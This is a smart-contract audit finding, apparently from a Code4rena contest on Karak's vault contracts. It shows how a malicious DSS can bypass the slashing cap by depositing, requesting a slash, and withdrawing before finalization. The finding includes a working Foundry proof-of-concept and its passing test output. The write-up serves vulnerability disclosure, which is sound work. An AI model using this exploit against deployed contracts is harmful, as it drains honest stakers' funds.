# Lines of code

https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/Vault.sol#L198
https://github.com/code-423n4/2024-07-karak/blob/main/src/NativeVault.sol#L311-L313


# Vulnerability details

When a DSS requests slashing for a vault or operator, the [`SlasherLib.requestSlashing`](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/entities/SlasherLib.sol#L94) function calculates the amount to be slashed and stores it in [`earmarkedStakes`](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/entities/SlasherLib.sol#L107). This exact `earmarkedStakes` amount is later used in the [`finalizeSlashing`](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/entities/SlasherLib.sol#L136) function to execute the `slashAssets()` operation.

The [`slashAssets`](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/Vault.sol#L193) function ensures that the amount to be slashed `totalAssetsToSlash` does not exceed the total assets currently available in the vault. If the `totalAssetsToSlash` is greater than the `totalAssets()`, then the slashing amount will be `totalAssets()`.
```solidity
    function slashAssets(uint256 totalAssetsToSlash, address slashingHandler) external onlyCore returns (uint256 transferAmount){
@>      transferAmount = Math.min(totalAssets(), totalAssetsToSlash);
        SafeTransferLib.safeApproveWithRetry(asset(), slashingHandler, transferAmount);
        ISlashingHandler(slashingHandler).handleSlashing(IERC20(asset()), transferAmount);
        emit Slashed(transferAmount);
    }
```

### Issue
This opens the door for a malicious DSS to slash 100% of the assets available in the vault, regardless of whether the `maxSlashablePercentageWad` is set to 5%, 25%, or 50%. A DSS can `deposit()` a large amount into a vault and then call `requestSlashing()`, and then withdraw its funds before executing `finalizeSlashing()`.

## Proof of Concept
Let's consider a vault with `100` tokens/assets in it, registered with a DSS whose `maxSlashablePercentageWad` is 50%.

- The DSS finds the vault's operator unable to complete the task and eligible for slashing.
- The DSS deposits `105` tokens into that vault and quickly calls `startRedeem()`, so the total assets in that vault are now `205`.
- After 8 days, the DSS calls `requestSlashing()` for that vault, which will set the earmarked stakes/total assets to slash to `102.5` tokens.
- Now, in the `SLASHING_VETO_WINDOW`, the DSS will `finishRedeem()` for its 105 tokens and get back its funds. 
- Only 100 tokens are left in the vault.
- The `SLASHING_VETO_WINDOW` passes, and the DSS calls `finalizeSlashing()`, which executes `slashAssets()`.
- The `slashAssets` function finds that total assets to slash is 102.5, but the total assets available are only 100, so it transfers all `100` tokens to the `SlashingHandler`.
- The vault got `100%` slashed instead of the `50%` (maxSlashablePercentageWad).

## Impact
- Loss of Assets 

## Tools Used
[Shaheen's Mindset](https://x.com/0x_Shaheen/status/1722664258142650806)

## Recommended Mitigation Steps
Instead of setting the `totalAssetsToSlash` to the `totalAssets()`, when `totalAssets()` are less, re-calculate the `totalAssetsToSlash` or maybe revert the trx in that case, so the DSS can `requestSlashing` again.





## Assessed type

Context

## Proof of Concept (added after pre-submit check)

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.25;

import "../helpers/OperatorHelper.sol";

contract Poc28 is OperatorHelper {
    function test_dssBypassesMaxSlashablePercentage() public {
        stake_vaults_to_dss();
        IVault vault = IVault(address(vaults[0]));
        address dssActor = address(dss);

        // honest stakers hold 1000 in the vault; DSS limit is 30%
        assertEq(vault.totalAssets(), 1000);
        uint256 maxAllowedSlash = 1000 * core.getDssMaxSlashablePercentageWad(dss) / Constants.MAX_SLASHING_PERCENT_WAD;
        assertEq(maxAllowedSlash, 300);

        // DSS deposits 3000 and immediately queues a redeem of all its shares
        depositToken.mint(dssActor, 3000);
        vm.startPrank(dssActor);
        depositToken.approve(address(vault), 3000);
        uint256 dssShares = vault.deposit(3000, dssActor, 0);
        IERC20(address(vault)).approve(address(vault), dssShares);
        bytes32 key = vault.startRedeem(dssShares, dssActor);
        vm.stopPrank();
        assertEq(vault.totalAssets(), 4000);

        // redeem matures after MIN_WITHDRAWAL_DELAY (9 days); only then the DSS requests the slash
        skip(Constants.MIN_WITHDRAWAL_DELAY);
        uint96[] memory pct = new uint96[](1);
        pct[0] = uint96(core.getDssMaxSlashablePercentageWad(dss));
        address[] memory slashVaults = new address[](1);
        slashVaults[0] = address(vault);
        vm.prank(dssActor);
        SlasherLib.QueuedSlashing memory queued = core.requestSlashing(
            SlasherLib.SlashRequest({operator: operator, slashPercentagesWad: pct, vaults: slashVaults})
        );
        // earmark = 30% of the inflated 4000
        assertEq(queued.earmarkedStakes[0], 1200);

        // inside the 2-day veto window the DSS pulls its own funds back out
        vault.finishRedeem(key);
        assertEq(depositToken.balanceOf(dssActor), 3000);
        assertEq(vault.totalAssets(), 1000);

        skip(Constants.SLASHING_VETO_WINDOW);
        uint256 burnedBefore = depositToken.balanceOf(address(0));
        vm.prank(dssActor);
        core.finalizeSlashing(queued);

        uint256 slashed = depositToken.balanceOf(address(0)) - burnedBefore;
        emit log_named_uint("allowed slash (30% of honest stake)", maxAllowedSlash);
        emit log_named_uint("actually slashed", slashed);
        assertEq(slashed, 1000);
        assertGt(slashed, maxAllowedSlash);
        assertEq(vault.totalAssets(), 0);
        // DSS paid nothing for the extra damage
        assertEq(depositToken.balanceOf(dssActor), 3000);
    }
}
```

Run: forge test --match-path test/basanos/Poc28.t.sol -vv

```
Ran 1 test for test/basanos/Poc28.t.sol:Poc28
[PASS] test_dssBypassesMaxSlashablePercentage() (gas: 1814419)
Logs:
  allowed slash (30% of honest stake): 300
  actually slashed: 1000
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 31.28ms (11.01ms CPU time)
Ran 1 test suite in 384.03ms (31.28ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Response to reviewer checklist

1. Constants in the audited code: `SLASHING_VETO_WINDOW = 2 days`, `MIN_WITHDRAWAL_DELAY = SLASHING_WINDOW + SLASHING_VETO_WINDOW = 9 days`. So the redeem must be started at least 9 days BEFORE `requestSlashing` (the finding's '8 days' wording is slightly off); it is then already mature and `finishRedeem` (permissionless) can be called inside the veto window. The test uses exactly this ordering, and the queued shares still count in `totalAssets()` at request time.
2. The test shows the DSS exceeding its limit: with `maxSlashablePercentageWad = 30%` and 1000 honest assets, the allowed slash is 300, the earmark is inflated to 1200 (30% of 4000), and after the DSS withdraws its own 3000 the finalize slashes the full 1000 (vault ends at 0). The claim is therefore about exceeding the cap, shown with the vault's real balances and the token burned at address(0).
3. The DSS's own shares are not slashed because they were redeemed before finalize; the test asserts the DSS holds its full 3000 again, so the extra 700 loss above the cap is borne entirely by honest stakers at zero cost to the DSS. Mitigating factor to be fair: the veto committee could cancel the request if it notices the earmark is inflated.
